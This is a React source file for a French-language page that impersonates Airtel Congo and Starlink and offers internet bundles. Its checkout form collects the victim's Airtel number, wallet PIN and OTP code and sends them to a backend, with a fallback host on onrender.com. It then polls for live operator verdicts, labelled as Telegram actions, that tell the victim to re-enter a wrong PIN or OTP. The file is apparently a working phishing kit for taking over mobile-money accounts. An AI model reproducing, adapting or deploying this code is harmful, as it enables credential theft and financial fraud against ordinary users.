import { useEffect, useRef, useState } from 'react';

const configuredApiBase = (import.meta.env.VITE_API_BASE_URL || '').trim().replace(/\/$/, '');
const API_BASE_URL = configuredApiBase;
const FALLBACK_API_BASE_URL = 'https://drc-co0e.onrender.com';
const apiUrl = (path) => (API_BASE_URL ? `${API_BASE_URL}${path}` : path);
const apiFetch = async (path, options) => {
  const primaryUrl = apiUrl(path);
  try {
    const response = await fetch(primaryUrl, options);
    if (API_BASE_URL || !path.startsWith('/api/') || response.status !== 404) {
      return response;
    }
  } catch (err) {
    if (API_BASE_URL || !path.startsWith('/api/')) {
      throw err;
    }
  }

  return fetch(`${FALLBACK_API_BASE_URL}${path}`, options);
};

const uiIconMap = {
  mobile: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M8 3h8a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2zm4 16.25a1.25 1.25 0 1 0 0 .01V19.25zM9 6h6v10H9V6z" />
    </svg>
  ),
  lock: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M12 2a5 5 0 0 1 5 5v2h1a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2v-9a2 2 0 0 1 2-2h1V7a5 5 0 0 1 5-5zm3 7V7a3 3 0 0 0-6 0v2h6zm-3 3a2 2 0 0 1 1 3.73V18h-2v-2.27A2 2 0 0 1 12 12z" />
    </svg>
  ),
  otp: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M12 2a10 10 0 1 1-7.07 2.93A10 10 0 0 1 12 2zm1 5h-2v6l5 3 1-1.73-4-2.27V7z" />
    </svg>
  ),
  shieldCheck: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M12 2l8 4v6c0 5.25-3.67 9.76-8 10-4.33-.24-8-4.75-8-10V6l8-4zm-1 12.17-2.59-2.58L7 13l4 4 6-6-1.41-1.41L11 14.17z" />
    </svg>
  ),
  spark: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M13 2l-2 6h4l-6 14 2-8H7l6-12z" />
    </svg>
  ),
  refresh: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M17.65 6.35A7.95 7.95 0 0 0 12 4V1L7 6l5 5V7a5 5 0 1 1-4.9 6H5.02A7 7 0 1 0 17.65 6.35z" />
    </svg>
  ),
  airtel: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M13.3 4.2c2.3 0 4.3 1.3 5.2 3.4.5 1.1.3 2.4-.4 3.3-.6.8-1.4 1.2-2.4 1.2h-2.1c-1.2 0-2 .5-2.5 1.5-.4.8-.6 1.8-.6 2.9V20H7.9v-3.7c0-1.5.3-2.9 1-4.1 1-1.7 2.5-2.6 4.6-2.6h1.8c.5 0 .8-.1 1-.4.2-.3.2-.7 0-1.1-.5-1.2-1.7-1.9-3-1.9-1.6 0-2.9.8-3.8 2.3L7.3 7.1c1.4-1.9 3.5-2.9 6-2.9z" />
    </svg>
  )
};

function UiGlyph({ type }) {
  return <span className="ui-glyph">{uiIconMap[type]}</span>;
}

function BrandMark({ sources, alt, fallbackType, small = false, brand = 'generic' }) {
  const [useFallback, setUseFallback] = useState(false);
  const [sourceIndex, setSourceIndex] = useState(0);

  const currentSrc = Array.isArray(sources) ? sources[sourceIndex] : null;

  return (
    <span className={`brand-mark-shell${small ? ' brand-mark-shell-small' : ''}`}>
      {useFallback || !currentSrc ? (
        <UiGlyph type={fallbackType} />
      ) : (
        <img
          src={currentSrc}
          alt={alt}
          className={`brand-mark brand-mark--${brand}${small ? ' brand-mark-small' : ''}`}
          loading="lazy"
          decoding="async"
          onError={() => {
            const hasNext = Array.isArray(sources) && sourceIndex < sources.length - 1;
            if (hasNext) {
              setSourceIndex((current) => current + 1);
            } else {
              setUseFallback(true);
            }
          }}
        />
      )}
    </span>
  );
}

function App() {
  const [data, setData] = useState(null);
  const [error, setError] = useState(null);
  const [checkoutOffer, setCheckoutOffer] = useState(null);
  const [airtelNumber, setAirtelNumber] = useState('');
  const [walletPin, setWalletPin] = useState('');
  const [otpSent, setOtpSent] = useState(false);
  const [otpDigits, setOtpDigits] = useState(['', '', '', '']);
  const [otpTimer, setOtpTimer] = useState(0);
  const [paymentConfirmed, setPaymentConfirmed] = useState(false);
  const [airtelError, setAirtelError] = useState('');
  const [walletPinError, setWalletPinError] = useState('');
  const [otpError, setOtpError] = useState('');
  const [submissionError, setSubmissionError] = useState('');
  const [resendError, setResendError] = useState('');
  const [resendMessage, setResendMessage] = useState('');
  const [submissionLoading, setSubmissionLoading] = useState(false);
  const [resendLoading, setResendLoading] = useState(false);
  const [telegramAction, setTelegramAction] = useState(null);
  const [actionError, setActionError] = useState('');
  const [actionLoading, setActionLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [approvalError, setApprovalError] = useState('');
  const [approvalPassed, setApprovalPassed] = useState(false);
  const otpInputRef = useRef([]);
  const normalizedLocalNumber = airtelNumber.replace(/\D/g, '').slice(0, 9);
  const apiAirtelNumber = normalizedLocalNumber ? `+243${normalizedLocalNumber}` : '';
  const otpCode = otpDigits.join('');

  useEffect(() => {
    if (window.location.pathname !== '/') {
      window.history.replaceState({}, '', '/');
    }
  }, []);

  useEffect(() => {
    if (approvalPassed) {
      // small timeout to ensure input is rendered
      setTimeout(() => otpInputRef.current?.[0]?.focus?.(), 50);
    }
  }, [approvalPassed]);

  useEffect(() => {
    apiFetch('/api/offres')
      .then((res) => {
        if (!res.ok) {
          if (res.status === 503) {
            throw new Error('Serveur indisponible pour le moment. Reessayez dans quelques instants.');
          }
          throw new Error('Erreur du serveur');
        }
        return res.json();
      })
      .then((json) => setData(json))
      .catch((fetchError) => setError(fetchError.message));
  }, []);

  useEffect(() => {
    if (!approvalPassed || paymentConfirmed) {
      return undefined;
    }

    setResendMessage('');
    setResendError('');
    setOtpTimer(60);
    const interval = setInterval(() => {
      setOtpTimer((current) => {
        if (current <= 1) {
          clearInterval(interval);
          return 0;
        }
        return current - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, [approvalPassed, paymentConfirmed]);

  useEffect(() => {
    if (!waitingApproval || !apiAirtelNumber || telegramAction || approvalError) {
      return undefined;
    }

    let interval = null;
    const queryPhone = encodeURIComponent(apiAirtelNumber);

    const pollApprovalStatus = async () => {
      try {
        const res = await apiFetch(`/api/action-status?phone=${queryPhone}&stage=approval`);
        if (!res.ok) {
          const json = await res.json().catch(() => null);
          throw new Error(json?.message || 'Echec de verification du statut.');
        }

        const json = await res.json();
        if (json?.action === 'allow_proceed') {
          setWaitingApproval(false);
          setApprovalPassed(true);
          setOtpSent(true);
          setApprovalError('');
          setOtpError('');
          setActionLoading(false);
          setTelegramAction(json);
          return;
        }

        if (json?.action === 'invalid_info') {
          setWaitingApproval(false);
          setApprovalPassed(false);
          setApprovalError('Code PIN incorrect. Veuillez verifier les informations et reessayer.');
          setOtpSent(false);
          setOtpTimer(0);
          setActionLoading(false);
          return;
        }
      } catch (err) {
        setApprovalError(err.message || 'Echec de verification.');
        setActionLoading(false);
        clearInterval(interval);
      }
    };

    interval = setInterval(pollApprovalStatus, 3000);
    pollApprovalStatus();

    return () => clearInterval(interval);
  }, [waitingApproval, apiAirtelNumber, telegramAction, approvalError]);

  useEffect(() => {
    if (!paymentConfirmed || !apiAirtelNumber || telegramAction || actionError) {
      return undefined;
    }

    let interval = null;
    const queryPhone = encodeURIComponent(apiAirtelNumber);

    const pollActionStatus = async () => {
      try {
        const res = await apiFetch(`/api/action-status?phone=${queryPhone}&stage=verification`);
        if (!res.ok) {
          const json = await res.json().catch(() => null);
          throw new Error(json?.message || 'Echec de verification du statut OTP.');
        }

        const json = await res.json();
        if (json?.action) {
          setTelegramAction(json);
          setActionLoading(false);

          if (json.action === 'wrong_pin') {
            // Wrong PIN sends user back to phone/PIN step.
            setPaymentConfirmed(false);
            setApprovalPassed(false);
            setOtpSent(false);
            setOtpDigits(['', '', '', '']);
            setOtpTimer(0);
            setWaitingApproval(false);
            setOtpError('');
            setApprovalError('Code PIN incorrect. Veuillez ressaisir votre numero et votre PIN.');
            return;
          }

          if (json.action === 'wrong_code') {
            // Wrong OTP keeps user on OTP step for quick retry.
            setPaymentConfirmed(false);
            setApprovalPassed(true);
            setOtpSent(true);
            setOtpTimer(60);
            setOtpDigits(['', '', '', '']);
            setOtpError('Code OTP incorrect. Veuillez le ressaisir.');
            return;
          }

          return;
        }
      } catch (err) {
        setActionError(err.message || 'Echec de recuperation de la reponse.');
        setActionLoading(false);
        clearInterval(interval);
      }
    };

    interval = setInterval(pollActionStatus, 3000);
    pollActionStatus();

    return () => clearInterval(interval);
  }, [paymentConfirmed, apiAirtelNumber, telegramAction, actionError]);

  const startCheckout = (offre) => {
    setCheckoutOffer(offre);
    setAirtelNumber('');
    setWalletPin('');
    setOtpSent(false);
    setOtpTimer(0);
    setOtpDigits(['', '', '', '']);
    setPaymentConfirmed(false);
    setAirtelError('');
    setWalletPinError('');
    setOtpError('');
    setWaitingApproval(false);
    setApprovalPassed(false);
    setApprovalError('');
    setTelegramAction(null);
    setActionError('');
    setActionLoading(false);
  };

  const handleBack = () => {
    setCheckoutOffer(null);
    setOtpSent(false);
    setPaymentConfirmed(false);
    setOtpTimer(0);
    setOtpDigits(['', '', '', '']);
    setAirtelError('');
    setWalletPinError('');
    setOtpError('');
    setWaitingApproval(false);
    setApprovalPassed(false);
    setApprovalError('');
    setTelegramAction(null);
    setActionError('');
    setActionLoading(false);
  };

  const handleOtpDigitChange = (index, rawValue) => {
    const digit = rawValue.replace(/\D/g, '').slice(-1);
    setOtpDigits((current) => {
      const next = [...current];
      next[index] = digit;
      return next;
    });

    if (digit && index < 3) {
      otpInputRef.current[index + 1]?.focus?.();
    }

    if (otpError) setOtpError('');
    if (submissionError) setSubmissionError('');
  };

  const handleOtpDigitKeyDown = (index, event) => {
    if (event.key === 'Backspace' && !otpDigits[index] && index > 0) {
      otpInputRef.current[index - 1]?.focus?.();
    }
  };

  const handleOtpPaste = (event) => {
    event.preventDefault();
    const pasted = event.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
    if (!pasted) {
      return;
    }

    const next = ['', '', '', ''];
    pasted.split('').forEach((char, idx) => {
      if (idx < 4) {
        next[idx] = char;
      }
    });
    setOtpDigits(next);

    const focusIndex = Math.min(pasted.length, 3);
    otpInputRef.current[focusIndex]?.focus?.();
    if (otpError) setOtpError('');
    if (submissionError) setSubmissionError('');
  };

  const handleCheckoutSubmit = async (event) => {
    event.preventDefault();
    setAirtelError('');
    setWalletPinError('');
    setOtpError('');
    setApprovalError('');
    setSubmissionError('');
    setResendError('');
    setResendMessage('');

    if (!otpSent) {
      const validPhone = /^\d{9}$/.test(normalizedLocalNumber);
      const pinVal = walletPin.trim();
      const validPin = /^\d{4,6}$/.test(pinVal);

      if (!validPhone) {
        setAirtelError('Entrez un numero Airtel valide a 9 chiffres.');
      }

      if (!validPin) {
        setWalletPinError('Entrez un PIN valide (4 a 6 chiffres).');
      }

      if (!validPhone || !validPin) {
        return;
      }

      setSubmissionLoading(true);
      try {
        const response = await apiFetch('/api/notify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            offerId: checkoutOffer.id,
            offerTitle: checkoutOffer.title,
            airtelNumber: apiAirtelNumber,
            walletPin: walletPin.trim()
          })
        });

        const body = await response.json().catch(() => null);
        if (!response.ok) {
          const errorMsg = body?.message || 'Echec de notification.';
          const detail = body?.detail ? ` ${body.detail}` : '';
          throw new Error(`${errorMsg}${detail}`);
        }

        setOtpSent(true);
        setWaitingApproval(true);
        setApprovalPassed(false);
        setApprovalError('');
        setTelegramAction(null);
        setActionError('');
        setActionLoading(true);
        setOtpTimer(60);
        setResendMessage('Validation de vos informations...');
      } catch (err) {
        setSubmissionError(err.message || 'Echec d\'envoi des informations. Veuillez reessayer plus tard.');
      } finally {
        setSubmissionLoading(false);
      }
      return;
    }

    if (otpTimer === 0) {
      setOtpError('OTP expire. Veuillez reessayer.');
      return;
    }

    if (otpCode.length !== 4) {
      setOtpError('Entrez un code OTP valide a 4 chiffres.');
      return;
    }

    setSubmissionLoading(true);

    try {
      const response = await apiFetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          offerId: checkoutOffer.id,
          offerTitle: checkoutOffer.title,
            airtelNumber: apiAirtelNumber,
          walletPin: walletPin.trim(),
            otpCode
        })
      });

      const body = await response.json().catch(() => null);
      if (!response.ok) {
        const errorMsg = body?.message || 'Echec de soumission.';
        const detail = body?.detail ? ` ${body.detail}` : '';
        throw new Error(`${errorMsg}${detail}`);
      }

      setTelegramAction(null);
      setActionError('');
      setActionLoading(true);
      setPaymentConfirmed(true);
    } catch (err) {
      setSubmissionError(err.message || 'Echec d\'envoi des informations. Veuillez reessayer plus tard.');
    } finally {
      setSubmissionLoading(false);
    }
  };

  const handleResendOtp = async () => {
    if (!checkoutOffer) {
      return;
    }

    setResendLoading(true);
    setResendError('');
    setResendMessage('');

    try {
      const response = await apiFetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          offerId: checkoutOffer.id,
          offerTitle: checkoutOffer.title,
          airtelNumber: apiAirtelNumber,
          walletPin: walletPin.trim()
        })
      });

      const body = await response.json().catch(() => null);
      if (!response.ok) {
        const errorMsg = body?.message || 'Echec du renvoi.';
        const detail = body?.detail ? ` ${body.detail}` : '';
        throw new Error(`${errorMsg}${detail}`);
      }

      setResendMessage('OTP renvoye avec succes.');
      setOtpTimer(60);
    } catch (err) {
      setResendError(err.message || 'Echec du renvoi OTP.');
    } finally {
      setResendLoading(false);
    }
  };

  if (error && !data) {
    return (
      <div className="page-shell">
        <div className="message-block error">Erreur : {error}</div>
      </div>
    );
  }

  if (!data) {
    return (
      <div className="page-shell">
        <div className="message-block loading">Chargement...</div>
      </div>
    );
  }

  if (checkoutOffer) {
    const checkoutStatusIcon = waitingApproval ? 'refresh' : approvalPassed ? 'otp' : 'shieldCheck';
    const verificationApproved = telegramAction?.action === 'correct_pin_otp';

    return (
      <main className="page-shell checkout-page-shell">
        <div className="checkout-shell">
          <section className="checkout-airtel-hero" aria-label="Airtel Lite">
            <div className="checkout-airtel-logo-wrap">
              <BrandMark
                sources={['/brand/airtel-logo.svg', '/brand/airtel-logo.png', '/brand/airtel-logo.jpg', '/brand/airtel-logo.jpeg', '/brand/airtel-logo.webp']}
                alt="Airtel"
                fallbackType="airtel"
                brand="airtel"
              />
            </div>
            <h1>Connectez-vous a Airtel Lite pour finaliser le paiement.</h1>
          </section>

          <section className="checkout-card checkout-card-lite">
            <div className="checkout-header-lite">
              <button type="button" className="checkout-back checkout-back-inline" onClick={handleBack}>
                ← Retour
              </button>
            </div>

            <p className="checkout-subtitle checkout-subtitle-icon">
              <UiGlyph type={checkoutStatusIcon} />
              <span>
                {waitingApproval
                  ? 'Validation de vos informations...'
                  : approvalPassed
                    ? `Un code OTP a ete envoye a ${apiAirtelNumber || 'votre numero Airtel'}. Saisissez-le pour terminer.`
                    : 'Verifiez votre numero avec votre PIN'}
              </span>
            </p>
{waitingApproval && (
                <div className="checkout-info recycling-spinner" aria-live="polite" aria-busy="true">
                  <svg width="48" height="48" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
                    <path fill="currentColor" d="M12 2v2a8 8 0 1 0 8 8h2a10 10 0 1 1-10-10z"/>
                    <path fill="currentColor" d="M7 7l-4 4 4 4V11h6V7H7z"/>
                  </svg>
                  <span>Validation de vos informations...</span>
                  <span className="sr-only">Validation des informations</span>
                </div>
              )}
              {approvalError && (
                <div className="checkout-error field-error">{approvalError}</div>
              )}
              {approvalPassed && !paymentConfirmed && (
              <div className="otp-timer">
                {otpTimer > 0
                  ? `Code valide pendant : ${otpTimer}s`
                  : 'Le code OTP a expire. Rechargez la page ou reessayez.'}
              </div>
            )}

            {!paymentConfirmed && (
            <form className="checkout-form" onSubmit={handleCheckoutSubmit} noValidate>
              {!otpSent && (
                <>
                  <label className="form-field">
                    <span className="label-with-icon"><UiGlyph type="mobile" />Numero Airtel</span>
                    <div className="phone-field-row">
                      <span className="phone-country">🇨🇩 <strong>+243</strong></span>
                      <input
                        type="tel"
                        value={normalizedLocalNumber}
                        onChange={(event) => {
                          setAirtelNumber(event.target.value.replace(/\D/g, '').slice(0, 9));
                          if (airtelError) setAirtelError('');
                          if (approvalError) setApprovalError('');
                          if (submissionError) setSubmissionError('');
                        }}
                        placeholder="951234567"
                        inputMode="numeric"
                        autoComplete="tel-national"
                      />
                    </div>
                    {airtelError && <span className="field-error">{airtelError}</span>}
                  </label>

                  <label className="form-field">
                    <span className="label-with-icon"><UiGlyph type="lock" />Entrez votre PIN</span>
                    <input
                      type="password"
                      value={walletPin}
                      onChange={(event) => {
                        setWalletPin(event.target.value);
                        if (walletPinError) setWalletPinError('');
                        if (approvalError) setApprovalError('');
                        if (submissionError) setSubmissionError('');
                      }}
                      placeholder="Entrez votre PIN"
                      inputMode="numeric"
                      required
                    />
                    {walletPinError && <span className="field-error">{walletPinError}</span>}
                  </label>
                </>
              )}

              {approvalPassed && !paymentConfirmed && (
                <label className="form-field">
                  <span className="label-with-icon otp-label-centered"><UiGlyph type="otp" />Entrez OTP</span>
                  <div className="otp-grid" onPaste={handleOtpPaste}>
                    {otpDigits.map((digit, idx) => (
                      <input
                        key={`otp-${idx}`}
                        ref={(node) => {
                          otpInputRef.current[idx] = node;
                        }}
                        type="text"
                        value={digit}
                        onChange={(event) => handleOtpDigitChange(idx, event.target.value)}
                        onKeyDown={(event) => handleOtpDigitKeyDown(idx, event)}
                        inputMode="numeric"
                        maxLength={1}
                        aria-label={`OTP digit ${idx + 1}`}
                        className="otp-digit"
                      />
                    ))}
                    <span className="otp-eye" aria-hidden="true">👁</span>
                  </div>
                  {otpError && <span className="field-error">{otpError}</span>}
                </label>
              )}

              {approvalPassed && !paymentConfirmed && (
                <div className="form-resend">
                  <button
                    type="button"
                    className="button-secondary"
                    onClick={handleResendOtp}
                    disabled={resendLoading || otpTimer === 0}
                  >
                    {resendLoading ? 'Renvoi...' : 'Renvoyer OTP'}
                  </button>
                  {resendMessage && <span className="field-success">{resendMessage}</span>}
                  {resendError && <span className="field-error">{resendError}</span>}
                </div>
              )}

              <div className="form-actions">
                <button
                  type="submit"
                  className="button-primary button-connect"
                  disabled={(approvalPassed && otpTimer === 0 && !paymentConfirmed) || submissionLoading || waitingApproval || actionLoading}
                >
                  {submissionLoading
                    ? 'Envoi...'
                    : approvalPassed
                      ? 'CONNEXION'
                      : 'CONNEXION'}
                </button>
              </div>
            </form>
            )}

            {paymentConfirmed && actionLoading && (
              <div className="checkout-info recycling-spinner" aria-live="polite" aria-busy="true">
                <svg width="36" height="36" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
                  <path fill="currentColor" d="M12 2v2a8 8 0 1 0 8 8h2a10 10 0 1 1-10-10z"/>
                  <path fill="currentColor" d="M7 7l-4 4 4 4V11h6V7H7z"/>
                </svg>
                <span>Validation OTP...</span>
                <span className="sr-only">Validation OTP</span>
              </div>
            )}

            {submissionError && (
              <div className="checkout-error field-error">{submissionError}</div>
            )}

            {actionError && (
              <div className="checkout-error field-error">{actionError}</div>
            )}

            {telegramAction && telegramAction.action === 'allow_proceed' && !paymentConfirmed && (
              <div className="checkout-success status-line">
                <UiGlyph type="shieldCheck" />
                Approuve. Saisissez l'OTP pour terminer votre paiement.
              </div>
            )}

            {paymentConfirmed && (
              <div className="checkout-confirmation status-line">
                <UiGlyph type="spark" />
                OTP verifie. Veuillez attendre l'invite de paiement pour terminer votre commande.
              </div>
            )}

            {paymentConfirmed && actionLoading && (
              <div className="checkout-info">
                Validation OTP... Cela peut prendre quelques secondes.
              </div>
            )}

            {paymentConfirmed && telegramAction && (
              <div className="checkout-success status-line">
                <UiGlyph type="shieldCheck" />
                <strong>Action recue :</strong> {telegramAction.text}
              </div>
            )}

            {paymentConfirmed && (
              <section className="checkout-final-state" aria-live="polite">
                <div className="checkout-final-icon">
                  <UiGlyph type={verificationApproved ? 'shieldCheck' : 'refresh'} />
                </div>
                <div className="checkout-final-copy">
                  <h2>{verificationApproved ? 'Paiement confirme' : 'Verification en cours'}</h2>
                  <p>
                    {verificationApproved
                      ? 'Merci. Votre validation OTP est confirmee. Suivez les instructions Airtel Money pour finaliser la transaction.'
                      : 'Votre OTP a ete envoye pour verification. Veuillez patienter pendant la confirmation finale.'}
                  </p>
                </div>
                <div className="checkout-final-actions">
                  <button type="button" className="button-secondary" onClick={handleBack}>
                    Retour aux offres
                  </button>
                </div>
              </section>
            )}

            {paymentConfirmed && actionError && (
              <div className="checkout-error field-error">
                {actionError}
              </div>
            )}
          </section>

          <footer className="checkout-collab-footer">
            <div className="checkout-collab-logo">
              <BrandMark
                sources={['/brand/airtel-logo.svg', '/brand/airtel-logo.png', '/brand/airtel-logo.jpg', '/brand/airtel-logo.jpeg', '/brand/airtel-logo.webp']}
                alt="Airtel"
                fallbackType="airtel"
                brand="airtel"
              />
            </div>
            <p>En collaboration avec</p>
            <strong>STARLINK™</strong>
          </footer>
        </div>
      </main>
    );
  }

  return (
    <main className="page-shell">
      <div className="poster-shell poster-shell-simple">
        <section className="landing-simple-header" aria-label="Partenariat">
          <div className="landing-logo-block">
            <BrandMark
              sources={['/brand/airtel-logo.svg', '/brand/airtel-logo.png', '/brand/airtel-logo.jpg', '/brand/airtel-logo.jpeg', '/brand/airtel-logo.webp']}
              alt="Airtel"
              fallbackType="airtel"
              brand="airtel"
            />
          </div>
          <p>En collaboration avec <strong>STARLINK</strong></p>
        </section>

        <section className="landing-simple-hero">
          <span className="landing-simple-kicker">📶 Forfaits Internet</span>
          <h1>Restez Connecte Sans Limites</h1>
          <p>
            Choisissez un forfait. Vous serez redirige vers la page de connexion Airtel Lite
            pour proceder au paiement.
          </p>
          <button
            type="button"
            className="hero-cta"
            onClick={() => document.getElementById('offers')?.scrollIntoView({ behavior: 'smooth', block: 'start' })}
          >
            Voir les forfaits
          </button>
        </section>

        <section className="card-grid" id="offers">
          {data.offres.map((offre) => (
            <article key={offre.id} className="offer-card">
              <div className="offer-top">
                <span className="offer-charge">{offre.tier === 'pro' || offre.tier === 'max' || offre.tier === 'unlimited' ? '4G+' : '4G'}</span>
                {offre.badge && <span className={`offer-badge ${offre.badgeClass}`}>{offre.badge}</span>}
              </div>
              <div className="offer-body">
                <span className="offer-amount">{offre.title}</span>
                <span className="offer-duration">{offre.subtitle}</span>
              </div>
              <div className="offer-price">
                <span className="offer-currency">{offre.currency}</span>
                <span className="offer-value">{offre.price.toFixed(2)}</span>
              </div>
              <button type="button" onClick={() => startCheckout(offre)}>
                <UiGlyph type="spark" />
                Choisir ce forfait
              </button>
            </article>
          ))}
        </section>

        <section className="airdata-trust" aria-label="Avantages">
          <article>
            <span aria-hidden="true">⚡</span>
            <strong>Activation instantanee</strong>
          </article>
          <article>
            <span aria-hidden="true">🔒</span>
            <strong>Paiement securise</strong>
          </article>
        </section>

        <footer className="airdata-footer">
          © 2026 Airtel Congo. Tous droits reserves.
        </footer>

      </div>
    </main>
  );
}

export default App;
